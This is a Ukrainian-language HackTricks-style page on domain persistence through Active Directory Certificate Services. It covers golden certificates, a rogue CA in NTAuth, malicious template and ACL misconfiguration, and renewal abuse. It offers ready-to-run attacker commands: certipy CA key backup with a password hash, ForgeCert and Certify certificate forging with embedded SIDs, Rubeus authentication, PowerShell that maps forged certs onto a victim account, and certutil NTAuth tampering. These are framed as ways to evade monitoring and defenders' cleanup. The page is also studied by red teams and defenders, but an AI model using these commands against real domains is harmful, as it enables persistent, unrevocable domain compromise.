# Збереження доступу до домену AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Це короткий огляд технік збереження доступу до домену, описаних у [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Перегляньте його для отримання додаткових відомостей.<sup>[[5]](#references)</sup>

## Підроблення сертифікатів за допомогою викрадених сертифікатів CA (Golden Certificate) - DPERSIST1

Як визначити, що сертифікат є сертифікатом CA?

Можна визначити, що сертифікат є сертифікатом CA, якщо виконуються кілька умов:<sup>[[5]](#references)</sup>

- Сертифікат зберігається на сервері CA, а його приватний ключ захищений DPAPI комп'ютера або апаратними засобами, такими як TPM/HSM, якщо операційна система їх підтримує.
- Поля Issuer і Subject сертифіката відповідають distinguished name CA.
- У сертифікатах CA виключно присутнє розширення "CA Version".
- Сертифікат не містить полів Extended Key Usage (EKU).

Для вилучення приватного ключа цього сертифіката підтримуваним методом на сервері CA є інструмент `certsrv.msc` через вбудований графічний інтерфейс. Проте цей сертифікат не відрізняється від інших сертифікатів, що зберігаються в системі; тому для його вилучення можна застосовувати такі методи, як [техніка THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Сертифікат і приватний ключ також можна отримати за допомогою Certipy такою командою:<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Після отримання сертифіката CA та його приватного ключа у форматі `.pfx` можна використовувати такі інструменти, як [ForgeCert](https://github.com/GhostPack/ForgeCert), для створення дійсних сертифікатів:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Користувач, для якого підробляється certificate, має бути активним і здатним проходити автентифікацію в Active Directory, щоб процес завершився успішно. Підроблення certificate для спеціальних облікових записів, таких як krbtgt, є неефективним.

Цей підроблений certificate буде **дійсним** до вказаної кінцевої дати та **доки дійсний certificate кореневого CA** (зазвичай від 5 до **10+ років**). Він також дійсний для **машин**, тому в поєднанні з **S4U2Self** зловмисник може **підтримувати persistence на будь-якій машині домену** протягом усього терміну дії certificate CA.\
Крім того, **certificates, згенеровані** цим методом, **не можна відкликати**, оскільки CA не знає про їх існування.

### Робота в умовах Strong Certificate Mapping Enforcement (2025+)

Починаючи з 11 лютого 2025 року (після розгортання KB5014754), контролери домену за замовчуванням використовують **Full Enforcement** для зіставлення certificates. Практично це означає, що ваші підроблені certificates мають або:

- Містити strong binding із цільовим обліковим записом (наприклад, розширення безпеки SID), або
- Бути поєднаними з strong, явним mapping в атрибуті `altSecurityIdentities` цільового об’єкта.<sup>[[1]](#references)</sup>

Надійний підхід для persistence — створити підроблений certificate, пов’язаний ланцюжком із викраденим Enterprise CA, а потім додати strong, явний mapping до victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Примітки
- Якщо ви можете створити підроблені сертифікати, що містять розширення безпеки SID, вони неявно зіставлятимуться навіть у режимі Full Enforcement. В іншому разі надавайте перевагу явним strong mappings. Див. [account-persistence](account-persistence.md), щоб дізнатися більше про явні зіставлення.
- Відкликання не допомагає захисникам у цьому випадку: підроблені сертифікати невідомі базі даних CA, тому їх неможливо відкликати.

#### Підроблення, сумісне з Full-Enforcement (SID-aware)

Оновлені інструменти дають змогу безпосередньо вбудовувати SID, завдяки чому golden certificates залишаються придатними до використання навіть тоді, коли DC відхиляють слабкі зіставлення:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Вбудувавши SID, ви уникаєте необхідності змінювати `altSecurityIdentities`, за яким можуть стежити, і водночас проходите перевірки посиленого зіставлення.

## Довіра до шахрайських сертифікатів CA - DPERSIST2

Об’єкт `NTAuthCertificates` призначений для зберігання одного або кількох **сертифікатів CA** у своєму атрибуті `cacertificate`, який використовує Active Directory (AD). Процес перевірки, що виконується **контролером домену**, передбачає пошук в об’єкті `NTAuthCertificates` запису, що відповідає **CA, вказаному** в полі Issuer сертифіката, який використовується для автентифікації. Автентифікація продовжується, якщо відповідний запис знайдено.<sup>[[5]](#references)</sup>

Зловмисник може додати самопідписаний сертифікат CA до об’єкта `NTAuthCertificates`, якщо він контролює цей об’єкт AD. Зазвичай лише члени групи **Enterprise Admin**, а також **Domain Admins** або **Administrators** у **домені кореня лісу**, мають дозвіл на зміну цього об’єкта. Вони можуть редагувати об’єкт `NTAuthCertificates` за допомогою `certutil.exe`, виконавши команду `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, або використовуючи [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Додаткові корисні команди для цієї техніки:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ця можливість є особливо актуальною, коли використовується разом із раніше описаним методом із застосуванням ForgeCert для динамічного створення сертифікатів.

> Міркування щодо mapping після 2025 року: розміщення rogue CA у NTAuth лише встановлює довіру до CA, що видає сертифікати. Щоб використовувати leaf-сертифікати для logon, коли DC працюють у режимі **Full Enforcement**, leaf має або містити SID security extension, або для цільового об’єкта має існувати сильне явне mapping (наприклад, Issuer+Serial в `altSecurityIdentities`). Див. {{#ref}}account-persistence.md{{#endref}}.

## Шкідлива неправильна конфігурація - DPERSIST3

Можливостей для **persistence** через **модифікації security descriptor** компонентів AD CS існує чимало. Модифікації, описані в розділі "[Domain Escalation](domain-escalation.md)", можуть бути зловмисно впроваджені attacker'ом із підвищеним доступом. Це включає додавання "control rights" (наприклад, WriteOwner/WriteDACL тощо) до таких чутливих компонентів:<sup>[[5]](#references)</sup>

- Об’єкт **AD computer** сервера **CA**
- **RPC/DCOM server** сервера **CA**
- Будь-який **descendant AD object або container** у **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (наприклад, container Certificate Templates, container Certification Authorities, об’єкт NTAuthCertificates тощо)
- **AD groups**, яким за замовчуванням або організацією делеговано права для керування AD CS (наприклад, вбудована група Cert Publishers та будь-які її члени)

Прикладом шкідливої реалізації може бути attacker, який має **підвищені дозволи** у домені та додає дозвіл **`WriteOwner`** до стандартного шаблону сертифікатів **`User`**, призначаючи attacker'а principal для цього права. Для експлуатації цього attacker спочатку змінює власника шаблону **`User`** на себе. Після цього в шаблоні встановлюється значення **`mspki-certificate-name-flag`** **1**, щоб увімкнути **`ENROLLEE_SUPPLIES_SUBJECT`**, що дозволяє користувачу вказати Subject Alternative Name у запиті. Далі attacker може виконати **enroll** за допомогою **template**, вибравши ім’я **domain administrator** як alternative name, і використати отриманий сертифікат для authentication як DA.

Практичні параметри, які attackers можуть встановити для довготривалої domain persistence (повні відомості та способи detection див. у {{#ref}}domain-escalation.md{{#endref}}):

- Прапорці політики CA, які дозволяють SAN від requesters (наприклад, увімкнення `EDITF_ATTRIBUTESUBJECTALTNAME2`). Це зберігає можливість експлуатувати шляхи на кшталт ESC1.
- DACL або налаштування template, які дозволяють issuance із можливістю authentication (наприклад, додавання Client Authentication EKU, увімкнення `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Контроль над об’єктом `NTAuthCertificates` або CA containers для постійного повторного додавання rogue issuers, якщо defenders намагаються виконати cleanup.

> [!TIP]
> У hardening-середовищах після KB5014754 поєднання цих неправильних конфігурацій із явними strong mappings (`altSecurityIdentities`) гарантує, що видані або forged certificates залишатимуться придатними для використання навіть тоді, коли DC застосовують strong mapping.

### Зловживання renewal сертифікатів (ESC14) для persistence

Якщо ви скомпрометували authentication-capable certificate (або Enrollment Agent), ви можете **renew** його безстроково, доки issuing template залишається опублікованим, а ваш CA і надалі довіряє ланцюжку issuer. Renewal зберігає початкові identity bindings, але подовжує validity, що ускладнює eviction, якщо тільки template не буде виправлено або CA не буде republished.<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Якщо контролери домену працюють у режимі **Full Enforcement**, додайте `-sid <victim SID>` (або використайте шаблон, який усе ще містить розширення безпеки SID), щоб оновлений кінцевий сертифікат і надалі надійно зіставлявся без змін у `altSecurityIdentities`. Зловмисники з правами адміністратора CA також можуть змінити `policy\RenewalValidityPeriodUnits`, щоб збільшити термін дії оновлених сертифікатів перед тим, як видати собі сертифікат.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – зміни автентифікації на основі сертифікатів на контролерах домену Windows (графік enforcement і надійні зіставлення)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – довідник команд і використання forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (інтегрований forge із підтримкою SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Огляд зловживання оновленням ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: зловживання Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
